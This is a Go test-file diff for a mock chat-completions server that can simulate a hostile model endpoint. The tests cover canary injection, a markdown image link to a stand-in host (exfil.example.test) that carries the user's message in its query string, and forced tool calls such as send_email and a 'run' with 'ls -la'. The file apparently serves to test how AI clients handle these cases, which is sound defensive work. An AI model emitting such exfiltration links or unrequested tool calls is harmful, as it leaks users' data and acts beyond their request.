@@ -279,3 +279,201 @@ func FuzzChatCompletionsHandler(f *testing.F) {
 		}
 	})
 }
+
+func configured(t *testing.T, o Options) http.Handler {
+	t.Helper()
+	s := newServer()
+	if err := s.Configure(o); err != nil {
+		t.Fatal(err)
+	}
+	return s.Handler()
+}
+
+// По умолчанию «вредоносное» поведение выключено.
+func TestMaliciousOffByDefault(t *testing.T) {
+	h := newServer().Handler()
+	if got := decode(t, post(t, h, userHello, "")).Choices[0].Message.Content; got != "Привет, модель" {
+		t.Fatalf("ответ изменён без параметров: %q", got)
+	}
+	req := httptest.NewRequestWithContext(context.Background(), http.MethodGet, LastRequestPath, nil)
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, req)
+	if rec.Code != http.StatusNotFound {
+		t.Fatalf("запись запроса включена без параметра: %d", rec.Code)
+	}
+}
+
+// DM-08 (канарейка), DM-11 (exfil-ссылка).
+func TestCanaryAndExfilInAnswer(t *testing.T) {
+	h := configured(t, Options{Canary: "CANARY-synthetic-0001", ExfilURL: "https://exfil.example.test/p.png"})
+	got := decode(t, post(t, h, userHello, "")).Choices[0].Message.Content
+	if !strings.Contains(got, "CANARY-synthetic-0001") {
+		t.Fatalf("нет канарейки: %q", got)
+	}
+	want := "![](https://exfil.example.test/p.png?d=%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82%2C+%D0%BC%D0%BE%D0%B4%D0%B5%D0%BB%D1%8C)"
+	if !strings.Contains(got, want) {
+		t.Fatalf("нет exfil-ссылки %q в %q", want, got)
+	}
+}
+
+// DM-11.
+func TestExfilQueryTruncated(t *testing.T) {
+	h := configured(t, Options{ExfilURL: "https://exfil.example.test/p?x=1"})
+	long := strings.Repeat("a", 500)
+	got := decode(t, post(t, h, `{"model":"m","messages":[{"role":"user","content":"`+long+`"}]}`, "fixed")).Choices[0].Message.Content
+	if !strings.Contains(got, "p?x=1&d="+strings.Repeat("a", exfilQueryRunes)+")") {
+		t.Fatalf("запрос не усечён: %q", got)
+	}
+}
+
+// DM-08.
+func TestCanaryInStream(t *testing.T) {
+	h := configured(t, Options{Canary: "CANARY-synthetic-0002"})
+	rec := post(t, h, `{"model":"m","stream":true,"messages":[{"role":"user","content":"привет"}]}`, "")
+	text, _ := readStream(t, rec.Body)
+	if !strings.Contains(text, "CANARY-synthetic-0002") {
+		t.Fatalf("нет канарейки в потоке: %q", text)
+	}
+}
+
+// DM-13: ответ модели — вызов инструмента с аргументами.
+func TestToolCallNonStream(t *testing.T) {
+	h := configured(t, Options{ToolName: "send_email", ToolArgs: `{"to":"a@example.test"}`})
+	rec := post(t, h, userHello, "")
+	var r struct {
+		Choices []struct {
+			FinishReason string `json:"finish_reason"`
+			Message      struct {
+				Content   *string
+				ToolCalls []struct {
+					ID, Type string
+					Function struct{ Name, Arguments string }
+				} `json:"tool_calls"`
+			}
+		}
+	}
+	if err := json.Unmarshal(rec.Body.Bytes(), &r); err != nil {
+		t.Fatal(err)
+	}
+	c := r.Choices[0]
+	if c.FinishReason != "tool_calls" || c.Message.Content != nil || len(c.Message.ToolCalls) != 1 ||
+		c.Message.ToolCalls[0].Function.Name != "send_email" || c.Message.ToolCalls[0].Function.Arguments != `{"to":"a@example.test"}` ||
+		c.Message.ToolCalls[0].Type != "function" || c.Message.ToolCalls[0].ID == "" {
+		t.Fatalf("неверный tool_calls: %s", rec.Body.String())
+	}
+}
+
+// DM-13.
+func TestToolCallStream(t *testing.T) {
+	h := configured(t, Options{ToolName: "run", ToolArgs: `{"cmd": "ls -la", "dir": "/tmp"}`})
+	rec := post(t, h, `{"model":"m","stream":true,"messages":[{"role":"user","content":"x"}]}`, "")
+	var name, args, finish string
+	sawDone := false
+	sc := bufio.NewScanner(rec.Body)
+	for sc.Scan() {
+		line := sc.Text()
+		if line == "data: [DONE]" {
+			sawDone = true
+			continue
+		}
+		data, ok := strings.CutPrefix(line, "data: ")
+		if !ok {
+			continue
+		}
+		var ch struct {
+			Choices []struct {
+				Delta struct {
+					ToolCalls []struct {
+						Function struct{ Name, Arguments string }
+					} `json:"tool_calls"`
+				}
+				FinishReason *string `json:"finish_reason"`
+			}
+		}
+		if err := json.Unmarshal([]byte(data), &ch); err != nil {
+			t.Fatal(err)
+		}
+		for _, tc := range ch.Choices[0].Delta.ToolCalls {
+			if tc.Function.Name != "" {
+				name = tc.Function.Name
+			}
+			args += tc.Function.Arguments
+		}
+		if f := ch.Choices[0].FinishReason; f != nil {
+			finish = *f
+		}
+	}
+	if name != "run" || args != `{"cmd": "ls -la", "dir": "/tmp"}` || finish != "tool_calls" || !sawDone {
+		t.Fatalf("имя=%q аргументы=%q финиш=%q done=%v", name, args, finish, sawDone)
+	}
+}
+
+func TestRecordLast(t *testing.T) {
+	h := configured(t, Options{RecordLast: true})
+	get := func(method string) (int, LastRequest) {
+		req := httptest.NewRequestWithContext(context.Background(), method, LastRequestPath, nil)
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, req)
+		var l LastRequest
+		if rec.Body.Len() > 0 {
+			if err := json.Unmarshal(rec.Body.Bytes(), &l); err != nil {
+				t.Fatal(err)
+			}
+		}
+		return rec.Code, l
+	}
+	if _, l := get(http.MethodGet); l.Received {
+		t.Fatalf("до запросов запись не пуста: %+v", l)
+	}
+	req := httptest.NewRequestWithContext(context.Background(), http.MethodPost, "/v1/chat/completions", strings.NewReader(userHello))
+	req.Header.Set("Authorization", "Bearer synthetic-key")
+	h.ServeHTTP(httptest.NewRecorder(), req)
+	_, l := get(http.MethodGet)
+	if !l.Received || l.Count != 1 || l.Body != userHello || !l.HasAuthorization || l.Model != "any" || l.Scenario != ScenarioEcho {
+		t.Fatalf("неверная запись: %+v", l)
+	}
+	if strings.Contains(l.Body, "synthetic-key") {
+		t.Fatal("ключ попал в запись")
+	}
+	if code, _ := get(http.MethodDelete); code != http.StatusNoContent {
+		t.Fatalf("сброс: %d", code)
+	}
+	if _, l := get(http.MethodGet); l.Received {
+		t.Fatalf("после сброса запись не пуста: %+v", l)
+	}
+}
+
+func TestOptionsValidate(t *testing.T) {
+	bad := []Options{
+		{ExfilURL: "ftp://x.test/"},
+		{ExfilURL: "javascript:alert(1)"},
+		{ExfilURL: "/relative"},
+		{ToolArgs: "{}"},
+		{Canary: strings.Repeat("a", maxOptionBytes+1)},
+	}
+	for _, o := range bad {
+		if o.Validate() == nil {
+			t.Errorf("параметры приняты: %+v", o)
+		}
+	}
+	if err := (Options{ExfilURL: "http://x.test/a", ToolName: "t"}).Validate(); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func FuzzOptionsHandler(f *testing.F) {
+	f.Add("c", "https://x.test/", "t", `{}`, "привет")
+	f.Fuzz(func(t *testing.T, canary, exfil, tool, args, user string) {
+		s := newServer()
+		if s.Configure(Options{Canary: canary, ExfilURL: exfil, ToolName: tool, ToolArgs: args}) != nil {
+			return
+		}
+		b, err := json.Marshal(map[string]any{"model": "m", "messages": []map[string]string{{"role": "user", "content": user}}})
+		if err != nil {
+			t.Fatal(err)
+		}
+		if rec := post(t, s.Handler(), string(b), ""); rec.Code != http.StatusOK {
+			t.Fatalf("код %d", rec.Code)
+		}
+	})
+}
